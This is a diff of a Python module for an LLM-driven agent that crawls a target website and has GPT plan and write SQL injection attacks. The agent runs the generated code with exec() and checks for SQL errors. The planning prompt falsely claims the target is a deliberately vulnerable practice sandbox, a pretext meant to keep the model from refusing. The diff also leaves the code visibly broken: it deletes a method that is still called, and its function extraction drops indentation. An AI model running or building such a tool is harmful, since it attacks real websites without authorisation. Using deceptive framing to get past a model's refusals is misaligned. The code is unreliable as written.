@@ -1,39 +1,34 @@
-import asyncio
 from typing import Optional
+from playwright.sync_api import sync_playwright
+from utils.spinner import Spinner
+from utils.gpt import gpt
+import asyncio
 from playwright.async_api import async_playwright, Playwright
 from bs4 import BeautifulSoup
-from langchain.llms import OpenAI
-from langchain.prompts import PromptTemplate
-from langchain.chains import LLMChain
-import os
-from dotenv import load_dotenv
-
-# Load environment variables from .env file
-load_dotenv()
-OPENAI_API_KEY = os.getenv('OPENAI_API_KEY')
-
-# Initialize the GPT model via LangChain
-llm = OpenAI(model_name="gpt-3.5-turbo", temperature=0.7)
+import re
+from utils.file_io import save_file
 
 class SQLInjector:
     """
-    LLM agent that tries to hack a website via SQL injection
+    LLM agent that tries to hack a website via SQL injection.
     """
     def __init__(self, base_url: str) -> None:
         """
         Constructor
 
         Parameters:
-        base_url (str): URL to the homepage of the target website
+        base_url (str): URL to the homepage of the target website.
         """
         self.baseURL = base_url
         self.urlsVisited: set[str] = set()
+        self.payload_history = []  # Lưu các payload đã thử
+
         self.browser = None
         self.page = None
 
     async def startup(self, playwright: Playwright) -> None:
         """
-        Launch Chromium and open a new page
+        Launch Chromium and open a new page.
         """
         chromium = playwright.chromium
         self.browser = await chromium.launch(headless=False)
@@ -46,8 +41,9 @@ class SQLInjector:
         Try SQL injection on the target website.
         """
         stack: list[str] = [self.page.url]
+        all_sql_payloads = ""
 
-        while len(stack) != 0:
+        while stack:
             url = stack.pop()
 
             if url in self.urlsVisited:
@@ -55,9 +51,9 @@ class SQLInjector:
 
             print("Current URL: ", url)
             self.urlsVisited.add(url)
-            
-            all_sql_payloads = ""
-            for num_trials in range(5):
+
+            # Reload the page and retry SQL injection if the previous attempt failed
+            for num_trials in range(3):  # Giới hạn số lần thử mỗi URL
                 print(f"Iteration {num_trials}")
 
                 await self.page.goto(url)
@@ -65,7 +61,7 @@ class SQLInjector:
 
                 html = await self.readHTML()
 
-                has_input, has_link, has_button = self.checkHTML(html)
+                has_input, has_link, has_button = checkHTML(html)
                 await asyncio.sleep(0.5)
 
                 if not has_input and not has_link and not has_button:
@@ -85,127 +81,153 @@ class SQLInjector:
                 func_str = await self.act(html, plan)
 
                 await asyncio.sleep(0.5)
+
                 newHtml = await self.readHTML()
 
+                # Check if the attack was successful
                 if await self.checkSuccess(newHtml, html):
                     print("SQL injection successful!")
                     return True
-                
+
                 sql_payloads = await self.extractSQLPayloads(function=func_str)
                 all_sql_payloads += sql_payloads
         
         print("SQL injection failed!")
         return False
 
-    async def readHTML(self) -> str:
+    async def readHTML(self, save_html=False) -> str:
         """
-        Helper function to read the HTML of the webpage currently held by this instance
+        Helper function to read the HTML of the webpage currently held by this instance.
         """
         html = await self.page.content()
+
         if html == '':
             raise Exception('Error when fetching the webpage, please check the network condition or try again.')
 
-        html = self.preprocessHTML(html)
+        if save_html:
+            save_file('test.html', html)
+
+        html = preprocessHTML(html)
         return html
 
     async def makePlan(self, html: str, failed_sql_payloads: Optional[str]=None) -> list[str]:
         """
-        Use GPT (via LangChain) to generate a SQL injection plan based on the HTML content
+        Make a plan of performing SQL injection.
         """
-        prompt_template = PromptTemplate(
-            input_variables=["html_content", "failed_payloads"],
-            template=("Here is the HTML content of a webpage:\n\n"
-                      "{html_content}\n\n"
-                      "The following SQL injection attempts have failed:\n{failed_payloads}\n\n"
-                      "Generate a new plan to perform SQL injection on this page.")
-        )
+        with Spinner("Writing a plan of hacking this website..."):
+            prompt = (f"I am learning website security, and I want to practice SQL injection to a sandbox website which is deliberately made vulnerable."
+                      f" Here's its HTML:\n\n{html}\n"
+                      f"Here are the failed SQL payloads:\n{failed_sql_payloads}\n"
+                      "Can you suggest actions to take?")
+            response = gpt(system_msg="", user_msg=prompt)
 
-        llm_chain = LLMChain(llm=llm, prompt=prompt_template)
-        plan = llm_chain.run({"html_content": html, "failed_payloads": failed_sql_payloads})
-        
-        print("Generated SQL injection plan:")
-        print(plan)
-        return plan.splitlines()
+        lines = response.split('\n')
+        plan = []
+        for line in lines:
+            if re.match(r'^\s*-?\d+', line):
+                plan.append(line)
+
+        print("Generated plan:")
+        print('\n'.join(plan))
+        return plan
 
     async def act(self, html: str, plan: str) -> str:
         """
-        Make the agent act based on the instruction provided by GPT via LangChain
+        Execute the plan.
         """
-        filtered_plan = [instruction for instruction in plan if "browser" not in instruction.lower() and "navigate" not in instruction.lower()]
-        plan_str = '\n'.join(filtered_plan)
+        filtered_plan = [instruction for instruction in plan if "browser" not in instruction.lower()]
 
-        prompt = f"Here is HTML content of a webpage:\n\n{html}\n\n" \
-                 f"Based on the plan:\n\n{plan_str}\n\nWrite Python code to perform these actions using Playwright."
-        
-        func_str = llm(prompt)
-        print(f"Generated function to execute:\n{func_str}")
+        if not filtered_plan:
+            return ""
+
+        prompt = (f"Based on this HTML:\n\n```html\n{html}\n```"
+                  f"Execute the following actions:\n\n{filtered_plan}\n")
+        response = gpt(system_msg="", user_msg=prompt)
+
+        func_str = extract_function(response, "func")
+        if func_str:
+            try:
+                exec(func_str, globals(), locals())
+                import types
+                self.func = types.MethodType(locals()['func'], self)
+                await asyncio.wait_for(self.func(), timeout=15.0)
+            except Exception as err:
+                if isinstance(err, asyncio.TimeoutError):
+                    print("Execution timed out.")
+                else:
+                    print(err)
+
         return func_str
-
-    async def extractSQLPayloads(self, function: str) -> str:
-        """
-        Extract SQL payloads used from the function generated by GPT via LangChain
-        """
-        prompt = f"Here is a Python script:\n\n{function}\n\nExtract and return any SQL injection payloads used in the script."
-        response = llm(prompt)
-        return response
 
     async def checkSuccess(self, newHtml: str, prevHtml: str) -> bool:
         """
-        Compare the new HTML content with the old one to check if the SQL injection succeeded
+        Check if SQL injection succeeded.
         """
-        prompt = f"Before SQL injection:\n{prevHtml}\n\nAfter SQL injection:\n{newHtml}\n\nDid the SQL injection succeed?"
-        response = llm(prompt)
-        return "YES" in response.upper()
+        if check_sql_errors(newHtml):
+            print("SQL error detected!")
+            return True
+
+        prompt = (f"Did the following HTML changes indicate a successful SQL injection?\n\n"
+                  f"Before:\n{prevHtml}\n\nAfter:\n{newHtml}")
+        response = gpt(system_msg="", user_msg=prompt)
+
+        return "YES" in response
 
     def checkLinks(self, html: str) -> list[str]:
         """
-        Extract the links worth visiting from the page
+        Extract useful links from the page.
         """
         soup = BeautifulSoup(html, "html.parser")
-        anchor_tags = soup.find_all('a')
-        hrefs = [tag.get('href') for tag in anchor_tags if tag.get('href')]
-        valid_hrefs = []
-        for href in hrefs:
-            if href.startswith(self.baseURL) or href.startswith('/'):
-                valid_hrefs.append(self.baseURL + href if href.startswith('/') else href)
+        hrefs = [tag.get('href') for tag in soup.find_all('a') if tag.get('href')]
+        valid_hrefs = [self.baseURL + href if href.startswith('/') else href for href in hrefs]
         return valid_hrefs
-
-    def preprocessHTML(self, html: str) -> str:
-        """
-        Clean HTML to make it easier for GPT to process
-        """
-        soup = BeautifulSoup(html, "html.parser")
-        for s in soup.select("script"):
-            s.extract()
-        for s in soup.select("style"):
-            s.extract()
-        if soup.head:
-            soup.head.extract()
-        return soup.body.prettify()
-
-    def checkHTML(self, html: str) -> tuple[bool]:
-        """
-        Check if the page contains input fields, links, or buttons
-        """
-        soup = BeautifulSoup(html, "html.parser")
-        input_elements = soup.find_all('input')
-        anchor_tags = soup.find_all('a')
-        buttons = soup.find_all('button')
-        return bool(input_elements), bool(anchor_tags), bool(buttons)
 
     async def shutDown(self):
         await self.browser.close()
 
 
-async def main():
-    url = input("Please enter a URL for SQL injection: ")
-    sql_injector = SQLInjector(base_url=url)
+### Helper Functions ###
 
-    async with async_playwright() as playwright:
-        await sql_injector.startup(playwright)
-        await sql_injector.trial()
-        await sql_injector.shutDown()
+def preprocessHTML(html: str) -> str:
+    """
+    Clean the HTML to make it easier for GPT to process.
+    """
+    soup = BeautifulSoup(html, "html.parser")
+    for s in soup(["script", "style"]):
+        s.extract()
 
+    head = soup.find("head")
+    if head:
+        head.extract()
 
-if __name__ == '__main__':
-    asyncio.run(main())
+    return soup.body.prettify()
+
+def checkHTML(html: str) -> tuple[bool, bool, bool]:
+    """
+    Check for input fields, anchor tags, and buttons in the HTML.
+    """
+    soup = BeautifulSoup(html, "html.parser")
+    has_input = bool(soup.find_all('input'))
+    has_link = bool(soup.find_all('a'))
+    has_button = bool(soup.find_all('button'))
+    return has_input, has_link, has_button
+
+def check_sql_errors(response_content: str) -> bool:
+    """
+    Check for common SQL error messages in the response content.
+    """
+    common_sql_errors = [
+        "SQL syntax error", "Unclosed quotation mark", "Unknown column",
+        "You have an error in your SQL syntax"
+    ]
+    return any(error in response_content for error in common_sql_errors)
+
+def extract_function(source_code: str, function_name: str) -> Optional[str]:
+    """
+    Extract the target function from a string of code.
+    """
+    pattern = rf"async def {function_name}\(.*\) -> None:([\s\S]+?)^\S"
+    match = re.search(pattern, source_code, re.MULTILINE)
+    if match:
+        return f"async def {function_name}(self):" + match.group(1).strip()
+    return None
